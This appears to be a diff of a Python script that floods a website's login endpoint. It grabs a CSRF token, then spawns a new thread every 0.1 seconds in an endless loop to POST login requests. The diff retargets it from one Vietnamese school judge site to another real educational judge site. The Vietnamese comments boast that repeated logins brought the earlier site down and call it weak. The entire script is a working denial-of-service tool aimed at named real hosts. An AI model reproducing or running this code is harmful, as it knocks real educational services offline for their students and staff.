@@ -2,10 +2,10 @@ import requests
 import time
 import threading
 
-url = "http://llt.thanhhoa.edu.vn:8089/accounts/login"
+url = "https://lqdoj.edu.vn/accounts/login"
 csrftoken = requests.get(url).cookies.get_dict()['csrftoken']
 
-def dang_nhap(): # Chả hiểu sao đăng nhập nhiều lại chết web được, ảo vl
+def dang_nhap(): # Không nền dùng cái này với LQDOJ, vì cái này đánh được mấy web nhỏ thôi, web lớn chịu
     try:
         body = {
             'csrfmiddlewaretoken': csrftoken,
@@ -22,4 +22,4 @@ def dang_nhap(): # Chả hiểu sao đăng nhập nhiều lại chết web đư�
 
 while True:
     threading.Thread(target=dang_nhap).start()
-    time.sleep(0.1) # Cái web yếu xìu này thì không cần phải tốn công mất sức làm gì
+    time.sleep(0.1)
